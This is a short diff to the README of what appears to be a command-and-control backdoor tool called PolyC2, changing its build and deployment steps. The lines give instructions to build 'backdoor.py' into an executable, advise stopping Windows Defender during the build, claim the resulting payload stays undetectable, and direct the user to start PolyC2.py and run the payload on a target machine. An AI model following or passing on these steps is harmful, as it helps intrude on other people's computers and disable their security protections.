@@ -48,9 +48,7 @@ anti-debugging
 2. install the modules using "pip3 install -r requirements.txt"
 
 
-3. and then "build" the backdoor.py using pyinstaller or nuitka (recommended pyinstaller)
-NOTE: if you are building on windows 11, windows 11 defender might detect and prevent the building process, so it is adviced that you stop windows defender, however the payload generated will still be undetectable
-
+3. Run control.py and **run the startup first then build**
 
 
 4. start the PolyC2.py on your machine and execute the payload on the target machine
